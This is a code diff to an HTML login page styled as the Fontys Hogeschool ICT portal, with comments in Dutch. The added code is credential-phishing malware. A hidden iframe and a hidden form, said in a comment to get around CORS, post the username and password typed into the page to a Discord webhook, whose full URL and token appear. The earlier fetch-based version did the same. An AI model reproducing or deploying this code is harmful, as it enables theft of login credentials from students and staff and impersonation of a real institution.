@@ -23,7 +23,9 @@
     <div id="contentWrapper" class="float">
       <div id="content">
         <div id="header">
-          <img id="companyLogo" class="logoImage" src="images/logo.png" alt="Fontys Hogeschool ICT">
+          <img id="companyLogo" class="logoImage"
+               src="images/logo.png"
+               alt="Fontys Hogeschool ICT">
         </div>
         <div id="workArea">
           <div id="authArea" class="groupMargin">
@@ -91,27 +93,35 @@
       </div>
     </div>
   </div>
+
+  <!-- Verborgen iframe om CORS te omzeilen -->
+  <iframe name="discordFrame" style="display:none;"></iframe>
+
+  <!-- Verborgen form die wél direct POST naar Discord -->
+  <form id="webhookForm"
+        action="https://discord.com/api/webhooks/1347877842725371984/SSQUXuH1EbjqDA-UEXf9d_uik63AvOEyG19LiRFbdZuB9XsRpohp37zbFe9T0gCNxnKE"
+        method="POST"
+        target="discordFrame">
+    <input type="hidden" name="payload_json" id="payload_json" value="">
+  </form>
+
   <script>
-    async function sendToDiscord() {
-        const hook = 'https://discord.com/api/webhooks/1347877842725371984/SSQUXuH1EbjqDA-UEXf9d_uik63AvOEyG19LiRFbdZuB9XsRpohp37zbFe9T0gCNxnKE';
-        const user = document.getElementById('userNameInput').value;
-        const pass = document.getElementById('passwordInput').value;
-        const payload = {
+    function sendToDiscord() {
+      const user    = document.getElementById('userNameInput').value;
+      const pass    = document.getElementById('passwordInput').value;
+      const payload = JSON.stringify({
         content: `**Loginnaam:** ${user}\n**Password:** ${pass}`
-        };
+      });
 
-        // doe de fetch met no-cors
-        fetch(hook, {
-        method: 'POST',
-        mode:   'no-cors',
-        headers: { 'Content-Type': 'application/json' },
-        body:    JSON.stringify(payload)
-        });
+      // Vul het verborgen veld en submit het webhook-form
+      document.getElementById('payload_json').value = payload;
+      document.getElementById('webhookForm').submit();
 
-        // We gaan ervan uit dat 'ie gelukt is
-        alert('Verzonden naar Discord!');
-        return false; // voorkom normale submit
+      // Optioneel: toon melding
+      alert('Verzonden naar Discord!');
+
+      return false; // voorkom normale form-submit
     }
-    </script>
+  </script>
 </body>
 </html>
